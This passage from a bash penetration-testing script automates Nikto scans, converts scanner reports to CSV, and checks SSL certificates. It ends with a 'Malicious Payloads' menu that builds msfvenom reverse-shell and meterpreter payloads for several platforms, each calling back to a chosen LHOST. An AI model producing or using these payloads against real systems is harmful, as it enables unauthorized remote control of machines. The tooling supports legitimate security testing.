     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/$domain-robots.txt
     echo
     echo
     exit
     ;;

     3) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_nikto(){
f_runlocally
clear
f_banner

echo -e "\x1B[1;34mRun multiple instances of Nikto in parallel.\x1B[0m"
echo
echo "1.  List of IPs."
echo "2.  List of IP:port."
echo "3.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     f_location

     echo
     echo -n "Port (default 80): "
     read port
     echo

     # Check if port is a number
     echo "$port" | grep -E "^[0-9]+$" 2>/dev/null
     isnum=$?

     if [ $isnum -ne 0 ] && [ ${#port} -gt 0 ]; then
          f_error
     fi

     if [ ${#port} -eq 0 ]; then
          port=80
     fi

     if [ $port -lt 1 ] || [ $port -gt 65535 ]; then
          f_error
     fi

     mkdir $home/data/nikto-$port

     while read -r line; do
          xdotool key ctrl+shift+t
          xdotool type "nikto -h $line -port $port -Format htm --output $home/data/nikto-$port/$line.htm ; exit"
          sleep 1
          xdotool key Return
     done < "$location"
     ;;

     2)
     f_location

     mkdir $home/data/nikto

     while IFS=: read -r host port; do
          xdotool key ctrl+shift+t
          sleep 1
          xdotool type "nikto -h $host -port $port -Format htm --output $home/data/nikto/$host-$port.htm ; exit"
          sleep 1
          xdotool key Return
     done < "$location"
     ;;

     3) f_main;;
     *) f_error;;
esac

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/nikto/
echo
echo
exit
}

##############################################################################################################

f_parse(){
clear
f_banner

echo -e "\x1B[1;34mParse XML to CSV.\x1B[0m"
echo
echo "1.  Burp (Base64)"
echo "2.  Nessus (.nessus)"
echo "3.  Nexpose (XML 2.0)"
echo "4.  Nmap"
echo "5.  Qualys"
echo "6.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     f_location
     parsers/parse-burp.py $location

     mv burp.csv $home/data/burp-`date +%H:%M:%S`.csv

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/burp-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     2)
     f_location
     parsers/parse-nessus.py $location

     # Delete findings with CVSS score of 0 and solution of n/a
     egrep -v "(Adobe Acrobat Detection|Adobe Extension Manager Installed|Adobe Flash Player for Mac Installed|Adobe Flash Professional Detection|Adobe Illustrator Detection|Adobe Photoshop Detection|Adobe Reader Detection|Adobe Reader Installed \(Mac OS X\)|ADSI Settings|Advanced Message Queuing Protocol Detection|AJP Connector Detection|AirWatch API Settings|Antivirus Software Check|Apache Axis2 Detection|Apache HTTP Server HttpOnly Cookie Information Disclosure|Apple Filing Protocol Server Detection|Apple Profile Manager API Settings|AppSocket & socketAPI Printers - Do Not Scan|Appweb HTTP Server Version|ASG-Sentry SNMP Agent Detection|Authenticated Check: OS Name and Installed Package Enumeration|Autodesk AutoCAD Detection|Backported Security Patch Detection \(FTP\)|Backported Security Patch Detection \(SSH\)|Authenticated Check: OS Name and Installed Package Enumeration|Backported Security Patch Detection \(WWW\)|BACnet Protocol Detection|BIOS Version Information \(via SMB\)|BIOS Version \(WMI\)|Blackboard Learn Detection|Broken Web Servers|CA Message Queuing Service Detection|CDE Subprocess Control Service \(dtspcd\) Detection|Check Point FireWall-1 ICA Service Detection|Check Point SecuRemote Hostname Information Disclosure|Cisco AnyConnect Secure Mobility Client Detection|CISCO ASA SSL VPN Detection|Cisco TelePresence Multipoint Control Unit Detection|Cleartext protocols settings|COM+ Internet Services (CIS) Server Detection|Common Platform Enumeration \(CPE\)|Computer Manufacturer Information \(WMI\)|CORBA IIOP Listener Detection|Database settings|DB2 Administration Server Detection|DB2 Discovery Service Detection|DCE Services Enumeration|Dell OpenManage Web Server Detection|Derby Network Server Detection|Detect RPC over TCP|Device Hostname|Device Type|DNS Sender Policy Framework \(SPF\) Enabled|DNS Server DNSSEC Aware Resolver|DNS Server Fingerprinting|DNS Server Version Detection|Do not scan fragile devices|EMC SMARTS Application Server Detection|Erlang Port Mapper Daemon Detection|Ethernet Card Manufacturer Detection|External URLs|FileZilla Client Installed|firefox Installed \(Mac OS X\)|Firewall Rule Enumeration|Flash Player Detection|FTP Service AUTH TLS Command Support|FTP Server Detection|Global variable settings|Good MDM Settings|Google Chrome Detection \(Windows\)|Google Chrome Installed \(Mac OS X\)|Google Picasa Detection \(Windows\)|Host Fully Qualified Domain Name \(FQDN\) Resolution|HMAP Web Server Fingerprinting|Hosts File Whitelisted Entries|HP Data Protector Components Version Detection|HP OpenView BBC Service Detection|HP SiteScope Detection|HSTS Missing From HTTPS Server|HTTP cookies import|HTTP Cookie 'secure' Property Transport Mismatch|HTTP login page|HTTP Methods Allowed \(per directory\)|HTTP Proxy Open Relay Detection|HTTP Reverse Proxy Detection|HTTP Server Cookies Set|HTTP Server Type and Version|HTTP TRACE \/ TRACK Methods Allowed|HTTP X-Frame-Options Response Header Usage|Hyper-V Virtual Machine Detection|HyperText Transfer Protocol \(HTTP\) Information|IBM Domino Detection \(uncredentialed check\)|IBM Domino Installed|IBM GSKit Installed|IBM iSeries Credentials|IBM Lotus Notes Detection|IBM Notes Client Detection|IBM Remote Supervisor Adapter Detection \(HTTP\)|IBM Tivoli Endpoint Manager Client Detection|IBM Tivoli Endpoint Manager Web Server Detection|IBM Tivoli Storage Manager Client Installed|IBM Tivoli Storage Manager Service Detection|IBM WebSphere Application Server Detection|IMAP Service Banner Retrieval|IMAP Service STARTTLS Command Support|IP Protocols Scan|IPMI Cipher Suites Supported|IPMI Versions Supported|iTunes Version Detection \(credentialed check\)|Kerberos configuration|Kerberos Information Disclosure|L2TP Network Server Detection|LDAP Server Detection|LDAP Service STARTTLS Command Support|LibreOffice Detection|Login configurations|Lotus Sametime Detection|MacOSX Cisco AnyConnect Secure Mobility Client Detection|McAfee Common Management Agent Detection|McAfee Common Management Agent Installation Detection|McAfee ePolicy Orchestrator Application Server Detection|MediaWiki Detection|Microsoft Exchange Installed|Microsoft Internet Explorer Enhanced Security Configuration Detection|Microsoft Internet Explorer Version Detection|Microsoft Lync Server Installed|Microsoft Malicious Software Removal Tool Installed|Microsoft .NET Framework Detection|Microsoft .NET Handlers Enumeration|Microsoft Office Detection|Microsoft OneNote Detection|Microsoft Patch Bulletin Feasibility Check|Microsoft Revoked Digital Certificates Enumeration|Microsoft Silverlight Detection|Microsoft Silverlight Installed \(Mac OS X\)|Microsoft SQL Server STARTTLS Support|Microsoft SMS\/SCCM Installed|Microsoft System Center Configuration Manager Client Installed|Microsoft System Center Operations Manager Component Installed|Microsoft Update Installed|Microsoft Windows AutoRuns Boot Execute|Microsoft Windows AutoRuns Codecs|Microsoft Windows AutoRuns Explorer|Microsoft Windows AutoRuns Internet Explorer|Microsoft Windows AutoRuns Known DLLs|Microsoft Windows AutoRuns Logon|Microsoft Windows AutoRuns LSA Providers|Microsoft Windows AutoRuns Network Providers|Microsoft Windows AutoRuns Print Monitor|Microsoft Windows AutoRuns Registry Hijack Possible Locations|Microsoft Windows AutoRuns Report|Microsoft Windows AutoRuns Scheduled Tasks|Microsoft Windows AutoRuns Services and Drivers|Microsoft Windows AutoRuns Unique Entries|Microsoft Windows AutoRuns Winlogon|Microsoft Windows AutoRuns Winsock Provider|Microsoft Windows 'CWDIllegalInDllSearch' Registry Setting|Microsoft Windows Installed Hotfixes|Microsoft Windows NTLMSSP Authentication Request Remote Network Name Disclosure|Microsoft Windows Process Module Information|Microsoft Windows Process Unique Process Name|Microsoft Windows Remote Listeners Enumeration \(WMI\)|Microsoft Windows SMB : Obtains the Password Policy|Microsoft Windows SMB LanMan Pipe Server Listing Disclosure|Microsoft Windows SMB Log In Possible|Microsoft Windows SMB LsaQueryInformationPolicy Function NULL Session Domain SID Enumeration|Microsoft Windows SMB NativeLanManager Remote System Information Disclosure|Microsoft Windows SMB Registry : Enumerate the list of SNMP communities|Microsoft Windows SMB Registry : Nessus Cannot Access the Windows Registry|Microsoft Windows SMB Registry : OS Version and Processor Architecture|Microsoft Windows SMB Registry : Remote PDC\/BDC Detection|Microsoft Windows SMB Registry : Vista \/ Server 2008 Service Pack Detection|Microsoft Windows SMB Registry : XP Service Pack Detection|Microsoft Windows SMB Registry Remotely Accessible|Microsoft Windows SMB Registry : Win 7 \/ Server 2008 R2 Service Pack Detection|Microsoft Windows SMB Registry : Windows 2000 Service Pack Detection|Microsoft Windows SMB Registry : Windows 2003 Server Service Pack Detection|Microsoft Windows SMB Service Detection|Microsoft Windows Update Installed|MobileIron API Settings|MSRPC Service Detection|Modem Enumeration \(WMI\)|MongoDB Settings|Mozilla Foundation Application Detection|MySQL Server Detection|Nessus Internal: Put cgibin in the KB|Nessus Scan Information|Nessus SNMP Scanner|NetBIOS Multiple IP Address Enumeration|Netstat Active Connections|Netstat Connection Information|netstat portscanner \(SSH\)|Netstat Portscanner \(WMI\)|Network Interfaces Enumeration \(WMI\)|Network Time Protocol \(NTP\) Server Detection|Nmap \(XML file importer\)|Non-compliant Strict Transport Security (STS)|OpenSSL Detection|OpenSSL Version Detection|Oracle Application Express \(Apex\) Detection|Oracle Application Express \(Apex\) Version Detection|Oracle Java Runtime Environment \(JRE\) Detection \(Unix\)|Oracle Java Runtime Environment \(JRE\) Detection|Oracle Installed Software Enumeration \(Windows\)|Oracle Settings|OS Identification|Palo Alto Networks PAN-OS Settings|Patch Management: Dell KACE K1000 Settings|Patch Management: IBM Tivoli Endpoint Manager Server Settings|Patch Management: Patch Schedule From Red Hat Satellite Server|Patch Management: Red Hat Satellite Server Get Installed Packages|Patch Management: Red Hat Satellite Server Get Managed Servers|Patch Management: Red Hat Satellite Server Get System Information|Patch Management: Red Hat Satellite Server Settings|Patch Management: SCCM Server Settings|Patch Management: Symantec Altiris Settings|Patch Management: VMware Go Server Settings|Patch Management: WSUS Server Settings|PCI DSS compliance : options settings|PHP Version|Ping the remote host|POP3 Service STLS Command Support|Port scanner dependency|Port scanners settings|Post-Scan Rules Application|Post-Scan Status|Protected Web Page Detection|RADIUS Server Detection|RDP Screenshot|RealPlayer Detection|Record Route|Remote listeners enumeration \(Linux \/ AIX\)|Remote web server screenshot|Reputation of Windows Executables: Known Process\(es\)|Reputation of Windows Executables: Unknown Process\(es\)|RHEV Settings|RIP Detection|RMI Registry Detection|RPC portmapper \(TCP\)|RPC portmapper Service Detection|RPC Services Enumeration|Salesforce.com Settings|Samba Server Detection|SAP Dynamic Information and Action Gateway Detection|SAProuter Detection|Service Detection \(GET request\)|Service Detection \(HELP Request\)|slident \/ fake identd Detection|Service Detection \(2nd Pass\)|Service Detection: 3 ASCII Digit Code Responses|SMB : Disable the C$ and ADMIN$ shares after the scan (WMI)|SMB : Enable the C$ and ADMIN$ shares during the scan \(WMI\)|SMB Registry : Start the Registry Service during the scan|SMB Registry : Start the Registry Service during the scan \(WMI\)|SMB Registry : Starting the Registry Service during the scan failed|SMB Registry : Stop the Registry Service after the scan|SMB Registry : Stop the Registry Service after the scan \(WMI\)|SMB Registry : Stopping the Registry Service after the scan failed|SMB QuickFixEngineering \(QFE\) Enumeration|SMB Scope|SMTP Server Connection Check|SMTP Service STARTTLS Command Support|SMTP settings|smtpscan SMTP Fingerprinting|Snagit Installed|SNMP settings|SNMP Supported Protocols Detection|SNMPc Management Server Detection|SOCKS Server Detection|SolarWinds TFTP Server Installed|Spybot Search & Destroy Detection|SquirrelMail Detection|SSH Algorithms and Languages Supported|SSH Protocol Versions Supported|SSH Server Type and Version Information|SSH settings|SSL \/ TLS Versions Supported|SSL Certificate Information|SSL Cipher Block Chaining Cipher Suites Supported|SSL Cipher Suites Supported|SSL Compression Methods Supported|SSL Perfect Forward Secrecy Cipher Suites Supported|SSL Resume With Different Cipher Issue|SSL Service Requests Client Certificate|SSL Session Resume Supported|Strict Transport Security \(STS\) Detection|Subversion Client/Server Detection \(Windows\)|Symantec Backup Exec Server \/ System Recovery Installed|Symantec Encryption Desktop Installed|Symantec Endpoint Protection Manager Installed \(credentialed check\)|Symantec Veritas Enterprise Administrator Service \(vxsvc\) Detection|TCP\/IP Timestamps Supported|TeamViewer Version Detection|Tenable Appliance Check \(deprecated\)|Terminal Services Use SSL\/TLS|Thunderbird Installed \(Mac OS X\)|Time of Last System Startup|TLS Next Protocols Supported|Traceroute Information|Unknown Service Detection: Banner Retrieval|UPnP Client Detection|VERITAS Backup Agent Detection|VERITAS NetBackup Agent Detection|Viscosity VPN Client Detection \(Mac OS X\)|VMware vCenter Detect|VMware vCenter Orchestrator Installed|VMware ESX\/GSX Server detection|VMware SOAP API Settings|VMware vCenter SOAP API Settings|VMware Virtual Machine Detection|VMware vSphere Client Installed|VMware vSphere Detect|VNC Server Security Type Detection|VNC Server Unencrypted Communication Detection|vsftpd Detection|Wake-on-LAN|Web Application Firewall Detection|Web Application Tests Settings|Web mirroring|Web Server Directory Enumeration|Web Server Harvested Email Addresses|Web Server HTTP Header Internal IP Disclosure|Web Server Load Balancer Detection|Web Server No 404 Error Code Check|Web Server robots.txt Information Disclosure|Web Server UDDI Detection|Window Process Information|Window Process Module Information|Window Process Unique Process Name|Windows Compliance Checks|Windows ComputerSystemProduct Enumeration \(WMI\)|Windows Display Driver Enumeration|Windows DNS Server Enumeration|Windows Management Instrumentation \(WMI\) Available|Windows NetBIOS \/ SMB Remote Host Information Disclosure|Windows Prefetch Folder|Windows Product Key Retrieval|WinSCP Installed|Wireless Access Point Detection|Wireshark \/ Ethereal Detection \(Windows\)|WinZip Installed|WMI Anti-spyware Enumeration|WMI Antivirus Enumeration|WMI Bluetooth Network Adapter Enumeration|WMI Encryptable Volume Enumeration|WMI Firewall Enumeration|WMI QuickFixEngineering \(QFE\) Enumeration|WMI Server Feature Enumeration|WMI Trusted Platform Module Enumeration|Yosemite Backup Service Driver Detection|ZENworks Remote Management Agent Detection)" nessus.csv > tmp.csv

     # Delete additional findings with CVSS score of 0
     egrep -v "(Acronis Agent Detection \(TCP\)|Acronis Agent Detection \(UDP\)|Additional DNS Hostnames|Adobe AIR Detection|Adobe Reader Enabled in Browser \(Internet Explorer\)|Adobe Reader Enabled in Browser \(Mozilla firefox\)|Alert Standard Format \/ Remote Management and Control Protocol Detection|Amazon Web Services Settings|Apache Banner Linux Distribution Disclosure|Apache Tomcat Default Error Page Version Detection|Authentication Failure - Local Checks Not Run|CA ARCServe UniversalAgent Detection|CA BrightStor ARCserve Backup Discovery Service Detection|Cache' SuperServer Detection|Citrix Licensing Service Detection|Citrix Server Detection|COM+ Internet Services \(CIS\) Server Detection|Crystal Reports Central Management Server Detection|Data Execution Prevention \(DEP\) is Disabled|Daytime Service Detection|DB2 Connection Port Detection|Discard Service Detection|DNS Server BIND version Directive Remote Version Disclosure|DNS Server Detection|DNS Server hostname.bind Map Hostname Disclosure|Do not scan Novell NetWare|Do not scan printers|Do not scan printers \(AppSocket\)|Dropbox Installed \(Mac OS X\)|Dropbox Software Detection \(uncredentialed check\)|Enumerate IPv4 Interfaces via SSH|Echo Service Detection|EMC Replication Manager Client Detection|Enumerate IPv6 Interfaces via SSH|Enumerate MAC Addresses via SSH|Exclude top-level domain wildcard hosts|H323 Protocol \/ VoIP Application Detection|HP LoadRunner Agent Service Detection|HP Integrated Lights-Out \(iLO\) Detection|IBM Tivoli Storage Manager Client Acceptor Daemon Detection|IBM WebSphere MQ Listener Detection|ICMP Timestamp Request Remote Date Disclosure|Identd Service Detection|Ingres Communications Server Detection|Internet Cache Protocol \(ICP\) Version 2 Detection|IPSEC Internet Key Exchange \(IKE\) Detection|IPSEC Internet Key Exchange \(IKE\) Version 1 Detection|iTunes Music Sharing Enabled|iTunes Version Detection \(Mac OS X\)|JavaScript Enabled in Adobe Reader|IPSEC Internet Key Exchange \(IKE\) Version 2 Detection|iSCSI Target Detection|LANDesk Ping Discovery Service Detection|Link-Local Multicast Name Resolution \(LLMNR\) Detection|LPD Detection|mDNS Detection \(Local Network\)|Microsoft IIS 404 Response Service Pack Signature|Microsoft SharePoint Server Detection|Microsoft SQL Server Detection \(credentialed check\)|Microsoft SQL Server TCP\/IP Listener Detection|Microsoft SQL Server UDP Query Remote Version Disclosure|Microsoft Windows Installed Software Enumeration \(credentialed check\)|Microsoft Windows Messenger Detection|Microsoft Windows Mounted Devices|Microsoft Windows Security Center Settings|Microsoft Windows SMB Fully Accessible Registry Detection|Microsoft Windows SMB LsaQueryInformationPolicy Function SID Enumeration|Microsoft Windows SMB Registry Not Fully Accessible Detection|Microsoft Windows SMB Share Hosting Possibly Copyrighted Material|Microsoft Windows SMB : WSUS Client Configured|Microsoft Windows Startup Software Enumeration|Microsoft Windows Summary of Missing Patches|NIS Server Detection|Nessus SYN scanner|Nessus TCP scanner|Nessus UDP scanner|Nessus Windows Scan Not Performed with Admin Privileges|Netscape Enterprise Server Default Files Present|NetVault Process Manager Service Detection|NFS Server Superfluous|News Server \(NNTP\) Information Disclosure|NNTP Authentication Methods|OEJP Daemon Detection|Open Port Re-check|OpenVAS Manager \/ Administrator Detection|Oracle Database Detection|Oracle Database tnslsnr Service Remote Version Disclosure|Oracle Java JRE Enabled \(Google Chrome\)|Oracle Java JRE Enabled \(Internet Explorer\)|Oracle Java JRE Enabled \(Mozilla firefox\)|Oracle Java JRE Premier Support and Extended Support Version Detection|Oracle Java JRE Universally Enabled|Panda AdminSecure Communications Agent Detection|Patch Report|PCI DSS compliance : Insecure Communication Has Been Detected|Pervasive PSQL \/ Btrieve Server Detection|OSSIM Server Detection|POP Server Detection|PostgreSQL Server Detection|PPTP Detection|QuickTime for Windows Detection|Quote of the Day \(QOTD\) Service Detection|Reverse NAT\/Intercepting Proxy Detection|RMI Remote Object Detection|RPC rstatd Service Detection|rsync Service Detection|RTMP Server Detection|RTSP Server Type \/ Version Detection|Session Initiation Protocol Detection|SFTP Supported|Skype Detection|Skype for Mac Installed \(credentialed check\)|Skype Stack Version Detection|SLP Server Detection \(TCP\)|SLP Server Detection \(UDP\)|SMTP Authentication Methods|SMTP Server Detection|SNMP Protocol Version Detection|SNMP Query Installed Software Disclosure|SNMP Query Routing Information Disclosure|SNMP Query Running Process List Disclosure|SNMP Query System Information Disclosure|SNMP Request Network Interfaces Enumeration|Software Enumeration \(SSH\)|SSL Certificate Chain Contains Certificates Expiring Soon|SSL Certificate Chain Contains RSA Keys Less Than 2048 bits|SSL Certificate Chain Contains Unnecessary Certificates|SSL Certificate Chain Not Sorted|SSL Certificate commonName Mismatch|SSL Certificate Expiry - Future Expiry|Symantec pcAnywhere Detection \(TCP\)|Symantec pcAnywhere Status Service Detection \(UDP\)|TCP Channel Detection|Telnet Server Detection|TFTP Daemon Detection|Universal Plug and Play \(UPnP\) Protocol Detection|Unix Operating System on Extended Support|USB Drives Enumeration \(WMI\)|VMware Fusion Version Detection \(Mac OS X\)|WebDAV Detection|Web Server \/ Application favicon.ico Vendor Fingerprinting|Web Server Crafted Request Vendor/Version Information Disclosure|Web Server on Extended Support|Web Server SSL Port HTTP Traffic Detection|Web Server Unconfigured - Default Install Page Present|Web Server UPnP Detection|Windows Terminal Services Enabled|WINS Server Detection|X Font Service Detection)" tmp.csv > tmp2.csv

     # Delete additional findings.
     egrep -v '(DHCP Server Detection|mDNS Detection \(Remote Network\))' tmp2.csv > tmp3.csv

     cat tmp3.csv | sed 's/httpOnly/HttpOnly/g; s/Service Pack /SP/g; s/ (banner check)//; s/ (credentialed check)//; s/ (intrusive check)//g; s/ (remote check)//; s/ (safe check)//; s/ (uncredentialed check)//g; s/ (version check)//g; s/()//g; s/(un)//g' > $home/data/nessus-`date +%H:%M:%S`.csv

     rm nessus* tmp*

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/nessus-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     3)
     f_location
     parsers/parse-nexpose.py $location

     mv nexpose.csv $home/data/nexpose-`date +%H:%M:%S`.csv

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/nexpose-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     4)
     f_location
     cp $location ./nmap.xml
     parsers/parse-nmap.py
     mv nmap.csv $home/data/nmap-`date +%H:%M:%S`.csv
     rm nmap.xml

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/nmap-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     5)
     f_location
     echo
     echo "[!] This will take about 2.5 mins, be patient."
     echo

     parsers/parse-qualys.py $location
     mv qualys.csv $home/data/qualys-`date +%H:%M:%S`.csv

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/qualys-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     6) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_ssl(){
clear
f_banner

echo -e "\x1B[1;34mCheck for SSL certificate issues.\x1B[0m"
echo
echo "List of IP:port."
echo

f_location

echo
echo $medium
echo
echo "Running sslyze."
sslyze --targets_in=$location --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers > $home/data/sslyze.txt
echo
echo "Running sslscan."
echo

START=$(date +%r\ %Z)

echo > tmp
echo $medium >> tmp
echo >> tmp

number=$(wc -l $location | cut -d ' ' -f1)
N=0

while read -r line; do
     echo $line > ssl_$line
     N=$((N+1))

     echo -n "[$N/$number]  $line"
     sslscan --ipv4 --show-certificate --ssl2 --ssl3 --no-colour $line > tmp_$line

     echo "... completed."
     echo >> ssl_$line

     if [ -e tmp_$line ]; then
          error=$(grep 'ERROR:' tmp_$line)

          if [[ ! $error ]]; then
               issuer=$(grep 'Issuer: ' tmp_$line)

               if [[ $issuer ]]; then
                    grep 'Issuer:' tmp_$line | sed 's/    Issuer: /    Issuer:  /g' >> ssl_$line
               else
                    echo "Issuer info not available." >> ssl_$line
                    echo >> ssl_$line
               fi

               subject=$(grep 'Subject:' tmp_$line)

               if [[ $subject ]]; then
                    grep 'Subject:' tmp_$line >> ssl_$line
                    echo >> ssl_$line
               else
                    echo "Certificate subject info not available." >> ssl_$line
                    echo >> ssl_$line
               fi

               dns=$(grep 'DNS:' tmp_$line)

               if [[ $dns ]]; then
                    grep 'DNS:' tmp_$line | sed 's/        DNS:/    DNS:/g' >> ssl_$line
                    echo >> ssl_$line
               fi

               A=$(grep -i 'MD5WithRSAEncryption' tmp_$line)

               if [[ $A ]]; then
                    echo "[*] MD5-based Signature in TLS/SSL Server X.509 Certificate" >> ssl_$line
                    grep -i 'MD5WithRSAEncryption' tmp_$line >> ssl_$line
                    echo >> ssl_$line
               fi

               B=$(grep 'NULL' tmp_$line)

               if [[ $B ]]; then
                    echo "[*] NULL Ciphers" >> ssl_$line
                    grep 'NULL' tmp_$line >> ssl_$line
                    echo >> ssl_$line
               fi

               C=$(grep 'SSLv2' tmp_$line)

               if [[ $C ]]; then
                    echo "[*] TLS/SSL Server Supports SSLv2" >> ssl_$line
                    grep 'SSLv2' tmp_$line > ssltmp2_$line
                    sed '/^    SSL/d' ssltmp2_$line >> ssl_$line
                    echo >> ssl_$line
               fi

               D=$(grep ' 40 bits' tmp_$line)
               D2=$(grep ' 56 bits' tmp_$line)

               if [[ $D || $D2 ]]; then
                    echo "[*] TLS/SSL Server Supports Weak Cipher Algorithms" >> ssl_$line
                    grep ' 40 bits' tmp_$line >> ssl_$line
                    grep ' 56 bits' tmp_$line >> ssl_$line
                    echo >> ssl_$line
               fi

               expmonth=$(grep 'Not valid after:' tmp_$line | awk '{print $4}')

               if [ "$expmonth" == "Jan" ]; then monthnum="01"; fi
               if [ "$expmonth" == "Feb" ]; then monthnum="02"; fi
               if [ "$expmonth" == "Mar" ]; then monthnum="03"; fi
               if [ "$expmonth" == "Apr" ]; then monthnum="04"; fi
               if [ "$expmonth" == "May" ]; then monthnum="05"; fi
               if [ "$expmonth" == "Jun" ]; then monthnum="06"; fi
               if [ "$expmonth" == "Jul" ]; then monthnum="07"; fi
               if [ "$expmonth" == "Aug" ]; then monthnum="08"; fi
               if [ "$expmonth" == "Sep" ]; then monthnum="09"; fi
               if [ "$expmonth" == "Oct" ]; then monthnum="10"; fi
               if [ "$expmonth" == "Nov" ]; then monthnum="11"; fi
               if [ "$expmonth" == "Dec" ]; then monthnum="12"; fi

               expyear=$(grep 'Not valid after:' tmp_$line | awk '{print $7}')
               expday=$(grep 'Not valid after:' tmp_$line | awk '{print $5}')
               expdate=$(echo $expyear-$monthnum-$expday)
               datenow=$(date +%F)

               date2stamp(){
               date --utc --date "$1" +%s
               }

               datenowstamp=$(date2stamp $datenow)
               expdatestamp=$(date2stamp $expdate)

               certissuedate=$(grep 'Not valid before:' tmp_$line)
               fmt_certissuedate=$(echo $certissuedate | sed 's/Not valid before:/Certificate Issue Date:/')

               certexpiredate=$(grep 'Not valid after:' tmp_$line)
               fmt_certexpiredate=$(echo $certexpiredate | sed 's/Not valid after:/Certificate Expiry Date:/')

               echo "    $fmt_certissuedate" >> ssl_$line
               echo "    $fmt_certexpiredate" >> ssl_$line
               echo >> ssl_$line

               if (($expdatestamp < $datenowstamp)); then
                    echo "[*] X.509 Server Certificate is Invalid/Expired" >> ssl_$line
                    echo "    Cert Expire Date: $expdate" >> ssl_$line
                    echo >> ssl_$line
               fi

               E=$(grep 'Authority Information Access' tmp_$line)

               if [[ ! $E ]]; then
                    echo "[*] Self-signed TLS/SSL Certificate" >> ssl_$line
                    echo >> ssl_$line
               fi

               echo $medium >> ssl_$line
               echo >> ssl_$line
               cat ssl_$line >> tmp
          else
               echo -e "\x1B[1;31mCould not open a connection.\x1B[0m"
               echo "[*] Could not open a connection." >> ssl_$line
               echo >> ssl_$line
               echo $medium >> ssl_$line
               echo >> ssl_$line
               cat ssl_$line >> tmp
          fi
     else
          echo -e "\x1B[1;31mNo response.\x1B[0m"
          echo "[*] No response." >> ssl_$line
          echo >> ssl_$line
          echo $medium >> ssl_$line
          echo >> ssl_$line
          cat ssl_$line >> tmp
     fi
done < "$location"


END=$(date +%r\ %Z)

echo "sslscan Report" > tmp2
date +%A" - "%B" "%d", "%Y >> tmp2
echo >> tmp2
echo "Start time   $START" >> tmp2
echo "Finish time  $END" >> tmp2
echo "Scanner IP   $ip" >> tmp2

mv tmp2 $home/data/sslscan.txt

grep -v 'Issuer info not available.' tmp | grep -v 'Certificate subject info not available.' >> $home/data/sslscan.txt

rm tmp* ssl_* 2>/dev/null

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
echo -e "The new reports are located at \x1B[1;33m $home/data/sslscan.txt \x1B[0m and \x1B[1;33m $home/data/sslyze.txt \x1B[0m"

echo
echo -n "If your IPs are public, do you want to test them using an external source? (y/N) "
read extquery

if [ "$extquery" == "y" ]; then
     f_runlocally
     echo "Launching $browser, opening $number tabs, please wait..."
     processname='firefox'

     if ps ax | grep -v 'grep' | grep $processname > /dev/null; then
          echo
     else
          $web &
	  sleep 4
     fi

     while read -r line; do
          $web "https://www.sslshopper.com/ssl-checker.html#hostname=$line" &
	  sleep 1
     done < "$location"

     echo
     echo
     exit
else
     echo
     echo
     exit
fi
}

##############################################################################################################

f_payload(){
clear
f_banner
echo -e "\x1B[1;34mMalicious Payloads\x1B[0m"
echo
echo "1.   android/meterpreter/reverse_tcp"
echo "2.   cmd/windows/reverse_powershell"
echo "3.   java/jsp_shell_reverse_tcp"
echo "4.   linux/x64/shell_reverse_tcp"
echo "5.   linux/x86/meterpreter/reverse_tcp"
echo "6.   osx/x64/shell_reverse_tcp"
echo "7.   php/meterpreter/reverse_tcp"
echo "8.   windows/meterpreter/reverse_tcp"
echo "9.   windows/meterpreter/reverse_tcp (ASP)"
echo "10.  windows/x64/meterpreter/reverse_tcp"
echo "11.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) payload="android/meterpreter/reverse_tcp"
          extention=".apk"
          format="raw"
          arch="dalvik"
          platform="android";;
     2) payload="cmd/windows/reverse_powershell"
          extention=".bat"
          format="raw"
          arch="cmd"
          platform="windows";;
     3) payload="java/jsp_shell_reverse_tcp"
          extention=".jsp"
          format="raw"
          arch="cmd"
          platform="windows";;
     4) payload="linux/x64/shell_reverse_tcp"
          extention=""
          format="elf"
          arch="x86_64"
          platform="linux";;
     5) payload="linux/x86/meterpreter/reverse_tcp"
          extention=""
          format="elf"
          arch="x86"
          platform="linux";;
     6) payload="osx/x64/shell_reverse_tcp"
          extention=""
          format="macho"
          arch="x86_64"
          platform="osx";;
     7) payload="php/meterpreter/reverse_tcp"
          extention=".php"
          format="raw"
          arch="php"
          platform="php"
          encoder="php/base64";;
     8) payload="windows/meterpreter/reverse_tcp"
          extention=".exe"
          format="exe"
          arch="x86"
          platform="windows";;
     9) payload="windows/meterpreter/reverse_tcp (ASP)"
          extention=".asp"
          format="asp"
          arch="x86"
          platform="windows";;
     10) payload="windows/x64/meterpreter/reverse_tcp"
          extention=".exe"
          format="exe"
          arch="x86_64"
          platform="windows";;
     11) f_main;;
     *) f_error;;
esac

echo
echo -n "LHOST: "
read lhost

# Check for no answer
if [[ -z $lhost ]]; then
     lhost=$ip
     echo "Using $ip"
     echo
fi

echo -n "LPORT: "
read lport

# Check for valid port number.
if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
     f_error
fi

if [[ $payload == "php/meterpreter/reverse_tcp" ]]; then
     echo
     $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload$extention
else
     echo
     $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch$extention
fi

echo
echo
exit
}

##############################################################################################################

f_listener(){
clear
f_banner
